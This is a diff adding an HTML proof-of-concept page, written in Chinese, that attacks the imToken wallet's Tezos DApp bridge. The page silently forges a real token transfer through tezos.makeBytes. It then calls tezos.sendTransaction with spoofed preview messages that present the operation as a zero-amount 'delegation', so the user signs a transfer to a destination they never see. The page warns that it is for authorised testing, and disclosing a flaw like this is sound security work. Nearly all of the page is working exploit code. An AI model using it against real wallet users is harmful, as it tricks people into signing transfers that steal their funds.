@@ -1,0 +1,443 @@
+<!doctype html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Tezos DApp Preview Mismatch PoC</title>
+    <style>
+      :root {
+        color-scheme: light;
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        background: #f6f8fb;
+        color: #172033;
+      }
+      body {
+        margin: 0;
+        padding: 20px;
+      }
+      main {
+        max-width: 760px;
+        margin: 0 auto;
+        background: #fff;
+        border: 1px solid #e5e8ef;
+        border-radius: 8px;
+        padding: 20px;
+        box-shadow: 0 8px 30px rgba(23, 32, 51, 0.08);
+      }
+      h1 {
+        margin: 0 0 10px;
+        font-size: 22px;
+      }
+      p {
+        line-height: 1.55;
+      }
+      label {
+        display: block;
+        margin: 14px 0 6px;
+        font-weight: 600;
+      }
+      input {
+        box-sizing: border-box;
+        width: 100%;
+        border: 1px solid #cdd5e1;
+        border-radius: 6px;
+        padding: 11px 12px;
+        font: inherit;
+      }
+      button {
+        width: 100%;
+        margin-top: 16px;
+        border: 0;
+        border-radius: 6px;
+        padding: 12px 14px;
+        background: #1769ff;
+        color: #fff;
+        font-weight: 700;
+        font-size: 15px;
+      }
+      button:disabled {
+        background: #9aa8bd;
+      }
+      .warn {
+        border-left: 4px solid #ff9f1a;
+        background: #fff8eb;
+        padding: 10px 12px;
+        border-radius: 6px;
+      }
+      .row {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-top: 14px;
+      }
+      .row input {
+        width: auto;
+      }
+      pre {
+        white-space: pre-wrap;
+        word-break: break-word;
+        min-height: 180px;
+        margin-top: 16px;
+        border-radius: 6px;
+        background: #111827;
+        color: #d1fae5;
+        padding: 14px;
+        font-size: 12px;
+        line-height: 1.45;
+      }
+      code {
+        background: #eef2f7;
+        border-radius: 4px;
+        padding: 1px 4px;
+      }
+    </style>
+  </head>
+  <body>
+    <main>
+      <h1>Tezos DApp 预览不一致 PoC</h1>
+      <p class="warn">
+        仅用于授权测试。请优先使用测试钱包或极小金额。这个页面会构造一笔真实
+        Tezos <code>transaction</code>，但提交给钱包预览的是伪装的
+        <code>delegation</code> 文案。
+      </p>
+
+      <label for="source">当前钱包 Tezos 地址 source</label>
+      <input id="source" placeholder="tz1... / tz2... / tz3...；可手动填写以跳过 getAccounts 卡住问题" autocomplete="off" />
+
+      <label for="to">实际收款地址 destination</label>
+      <input id="to" placeholder="tz1... / tz2... / tz3..." autocomplete="off" />
+
+      <label for="amount">实际转账金额 amount，单位 mutez</label>
+      <input id="amount" value="1" inputmode="numeric" />
+
+      <label for="fee">fee，单位 mutez</label>
+      <input id="fee" value="1420" inputmode="numeric" />
+
+      <div class="row">
+        <input id="ack" type="checkbox" />
+        <span>我确认使用测试账户或极小金额，并理解这会尝试发起真实链上交易。</span>
+      </div>
+
+      <button id="run" disabled>生成恶意 bytes 并调用 tezos.sendTransaction</button>
+      <pre id="log">等待输入...</pre>
+    </main>
+
+    <script>
+      const $ = (id) => document.getElementById(id)
+      const logEl = $("log")
+      const runBtn = $("run")
+      const ack = $("ack")
+
+      function log(message, data) {
+        const line =
+          data === undefined
+            ? message
+            : `${message}\n${JSON.stringify(data, null, 2)}`
+        logEl.textContent += `\n\n${line}`
+        logEl.scrollTop = logEl.scrollHeight
+      }
+
+      function getImToken() {
+        if (!window.imToken || !window.imToken.callPromisifyAPI) {
+          throw new Error("未检测到 imToken 注入对象，请在钱包 DApp 浏览器中打开本页")
+        }
+        return window.imToken
+      }
+
+      function hasFunction(value) {
+        return typeof value === "function"
+      }
+
+      function detectNativeTransport(targetWindow) {
+        const w = targetWindow || window
+        if (
+          w.ReactNativeWebView &&
+          hasFunction(w.ReactNativeWebView.postMessage)
+        ) {
+          return "ReactNativeWebView.postMessage"
+        }
+        if (
+          w.webkit &&
+          w.webkit.messageHandlers &&
+          w.webkit.messageHandlers.reactNative &&
+          hasFunction(w.webkit.messageHandlers.reactNative.postMessage)
+        ) {
+          return "webkit.messageHandlers.reactNative.postMessage"
+        }
+        if (
+          w.__REACT_WEB_VIEW_BRIDGE &&
+          hasFunction(w.__REACT_WEB_VIEW_BRIDGE.postMessage)
+        ) {
+          return "__REACT_WEB_VIEW_BRIDGE.postMessage"
+        }
+        return "window.postMessage fallback"
+      }
+
+      function getTopImTokenInfo() {
+        try {
+          return {
+            readable: true,
+            sameObject: window.top.imToken === window.imToken,
+            hasPostMessage:
+              !!window.top.imToken && hasFunction(window.top.imToken.postMessage),
+            transport: detectNativeTransport(window.top),
+          }
+        } catch (err) {
+          return {
+            readable: false,
+            error: err && err.message ? err.message : String(err),
+          }
+        }
+      }
+
+      function installCallbackProbe(imToken) {
+        if (imToken.__pocCallbackProbeInstalled) return
+        const original = imToken._handleApiCallback
+        imToken._handleApiCallback = function (data) {
+          log("诊断：当前 frame 收到 native 回调：", data)
+          return original.call(this, data)
+        }
+        imToken.__pocCallbackProbeInstalled = true
+      }
+
+      function logBridgeDiagnostics(imToken) {
+        installCallbackProbe(imToken)
+        const isPlainHttp = location.protocol === "http:"
+        log("0.0 bridge 环境诊断：", {
+          href: location.href,
+          plainHttpWillTriggerNoHttpsWarning: isPlainHttp,
+          isTopFrame: window === window.top,
+          imTokenVersion: imToken.version,
+          messageIdBeforeCall: imToken._messageId,
+          hasCallAPI: hasFunction(imToken.callAPI),
+          hasCallPromisifyAPI: hasFunction(imToken.callPromisifyAPI),
+          hasCurrentFrameCallback: hasFunction(imToken._handleApiCallback),
+          currentFrameTransport: detectNativeTransport(window),
+          topFrame: getTopImTokenInfo(),
+        })
+        if (isPlainHttp) {
+          log(
+            "诊断提示：当前是 http:// 页面，token-v2 会把它判定为 NO_HTTPS 风险页。跳过风险页会重建 WebView；如果 DappMessageManager 仍持有旧 WebView ref，native 收到请求后会把回调注入到旧页面，表现就是所有 SDK API 超时。"
+          )
+        }
+      }
+
+      function buildBridgeTimeoutHint(err) {
+        const reason = err && err.message ? err.message : err
+        if (
+          location.protocol === "http:" &&
+          window.ReactNativeWebView &&
+          hasFunction(window.ReactNativeWebView.postMessage)
+        ) {
+          return `普通 SDK API 也没有回调：${reason}。当前页面是 http://，会触发钱包 NO_HTTPS 风险页；跳过后 WebView 被重建，但 native 回调可能仍注入旧 WebView。请改用 HTTPS 地址复现，或在测试包里修正/重建 DappMessageManager 后再用 http 本地页。`
+        }
+        return `普通 SDK API 也没有回调：${reason}。请确认页面运行在钱包 DApp WebView 内，且不是外部浏览器/缓存旧页。`
+      }
+
+      function callImTokenAPI(imToken, apiName, payload, ms) {
+        return new Promise((resolve, reject) => {
+          const timer = setTimeout(
+            () => reject(new Error(`${apiName} 超时 ${ms}ms`)),
+            ms
+          )
+          imToken.callAPI(apiName, payload || {}, (err, result) => {
+            clearTimeout(timer)
+            if (err) {
+              reject(
+                new Error(
+                  typeof err === "string"
+                    ? err
+                    : err.message || JSON.stringify(err)
+                )
+              )
+            } else {
+              resolve(result)
+            }
+          })
+        })
+      }
+
+      function normalizeAccount(account) {
+        if (typeof account === "string") return account
+        if (account && typeof account.address === "string") return account.address
+        if (account && typeof account.address === "object") {
+          return account.address.address || account.address.value
+        }
+        return ""
+      }
+
+      function withTimeout(promise, ms, label, onTimeout) {
+        return new Promise((resolve, reject) => {
+          const timer = setTimeout(() => {
+            if (onTimeout) onTimeout()
+            reject(new Error(`${label} 超时 ${ms}ms`))
+          }, ms)
+          promise.then(
+            (value) => {
+              clearTimeout(timer)
+              resolve(value)
+            },
+            (err) => {
+              clearTimeout(timer)
+              reject(err)
+            }
+          )
+        })
+      }
+
+      function buildTransferOperation(source, destination, amount, fee) {
+        return {
+          kind: "transaction",
+          source,
+          destination,
+          amount: String(amount),
+          fee: String(fee),
+          gas_limit: "10600",
+          storage_limit: "300",
+        }
+      }
+
+      ack.addEventListener("change", () => {
+        runBtn.disabled = !ack.checked
+      })
+
+      runBtn.addEventListener("click", async () => {
+        logEl.textContent = "开始执行 PoC..."
+        runBtn.disabled = true
+        try {
+          const imToken = getImToken()
+          let source = $("source").value.trim()
+          const destination = $("to").value.trim()
+          const amount = $("amount").value.trim()
+          const fee = $("fee").value.trim()
+
+          logBridgeDiagnostics(imToken)
+          log("0. DApp bridge 预检：调用普通 API device.getCurrentLanguage")
+          try {
+            const language = await callImTokenAPI(
+              imToken,
+              "device.getCurrentLanguage",
+              {},
+              5000
+            )
+            log("device.getCurrentLanguage 返回：", language)
+          } catch (err) {
+            throw new Error(buildBridgeTimeoutHint(err))
+          }
+
+          if (!source) {
+            log("1. 未手动填写 source，尝试调用 tezos.getAccounts 获取当前 Tezos 账户")
+            try {
+              const accounts = await callImTokenAPI(
+                imToken,
+                "tezos.getAccounts",
+                {},
+                8000
+              )
+              log("tezos.getAccounts 返回：", accounts)
+              const list = Array.isArray(accounts) ? accounts : [accounts]
+              source = normalizeAccount(list[0])
+              if (source) $("source").value = source
+            } catch (err) {
+              throw new Error(
+                `无法自动获取 source：${err && err.message ? err.message : err}。请手动填写当前钱包 Tezos 地址后重试。`
+              )
+            }
+          } else {
+            log(`1. 使用手动填写的 source: ${source}`)
+          }
+          if (!source) throw new Error("请填写当前钱包 Tezos 地址 source")
+          if (!destination) throw new Error("请填写实际收款地址")
+          if (!/^[0-9]+$/.test(amount) || !/^[0-9]+$/.test(fee)) {
+            throw new Error("amount 和 fee 必须是 mutez 整数")
+          }
+
+          const operation = buildTransferOperation(
+            source,
+            destination,
+            amount,
+            fee
+          )
+          log("2. 实际将被签名/广播的 transaction operation：", operation)
+
+          let forged
+          log("3.1 读取钱包当前 Tezos RPC provider，用于判断 makeBytes 会访问哪个节点")
+          try {
+            const provider = await callImTokenAPI(
+              imToken,
+              "tezos.getProvider",
+              {},
+              5000
+            )
+            log("tezos.getProvider 返回：", provider)
+          } catch (err) {
+            log(
+              `tezos.getProvider 未返回，继续尝试 makeBytes：${err && err.message ? err.message : err}`
+            )
+          }
+
+          log("3.2 调用钱包暴露的 tezos.makeBytes。注意：这一步是静默 forge，不会弹出签名页")
+          log("等待 tezos.makeBytes 返回，最多 30 秒")
+          try {
+            forged = await callImTokenAPI(
+              imToken,
+              "tezos.makeBytes",
+              [operation],
+              30000
+            )
+            log("tezos.makeBytes 返回：", forged)
+          } catch (err) {
+            log("tezos.makeBytes 已等待 30 秒仍无回调，判定钱包侧 makeBytes/RPC 卡住")
+            throw new Error(
+              `tezos.makeBytes 未返回：${err && err.message ? err.message : err}。这一步卡在钱包内部 makeBytes/counter/forge/RPC，尚未进入 sendTransaction 签名弹窗。`
+            )
+          }
+
+          const forgedOperations = forged.operations || [operation]
+          const operationBytes = forged.bytes
+          if (!operationBytes) throw new Error("makeBytes 未返回 bytes")
+
+          const payload = {
+            from: source,
+            input: forgedOperations,
+            operationBytes,
+            messages: [
+              {
+                type: "delegationAddress",
+                value: "PoC benign baker preview, not the real destination",
+              },
+              {
+                type: "amount",
+                value: "0 XTZ shown by DApp-controlled preview",
+              },
+            ],
+            messageHeader: {
+              name: "delegation",
+              fee: "0.001 XTZ shown by DApp-controlled preview",
+            },
+          }
+          log("4. 传给 tezos.sendTransaction 的完整 payload：", payload)
+          log(
+            "现在钱包弹窗如果显示 delegation/伪造文案，而不是真实 transaction destination/amount，即证明漏洞成立。"
+          )
+          log(
+            "如果这里之后仍无弹窗，说明 sendTransaction 内部的 Tezos getHeader/RPC 也在等待；这属于复现环境的 RPC 卡点，不是 payload 构造问题。"
+          )
+
+          const result = await callImTokenAPI(
+            imToken,
+            "tezos.sendTransaction",
+            payload,
+            60000
+          )
+          log("5. tezos.sendTransaction 返回：", result)
+        } catch (err) {
+          log(`PoC 中止/失败：${err && err.message ? err.message : err}`)
+        } finally {
+          runBtn.disabled = !ack.checked
+        }
+      })
+    </script>
+  </body>
+</html>
